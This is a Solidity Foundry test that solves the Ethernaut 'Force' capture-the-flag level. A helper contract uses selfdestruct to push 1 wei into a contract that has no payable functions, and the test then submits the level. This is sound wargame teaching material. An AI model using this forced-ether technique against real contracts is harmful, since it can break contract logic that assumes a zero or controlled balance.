// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/core/Ethernaut.sol";
import "../src/levels/07-ForceFactory.sol";

contract ForceHackHelperContract {
    address private forceContractAddress;

    constructor(address _forceContractAddress) payable {
        forceContractAddress = _forceContractAddress;
    }

    function attack() public {
        selfdestruct(payable(forceContractAddress));
    }
}

contract ForceHackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 wei);
    }

    function testForceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ForceFactory factory = new ForceFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Force forceContract = Force(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // 1. We initialise `ForceHackHelperContract` with some wei
        // 2. We call attack which would `selfdestruct` that will send the ETH (1 wei) in the contract to specified address
        // In this case, the specified address is the address of the `ForceContract`
        ForceHackHelperContract forceHackHelper = new ForceHackHelperContract{
            value: 1 wei
        }(address(forceContract));
        forceHackHelper.attack();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
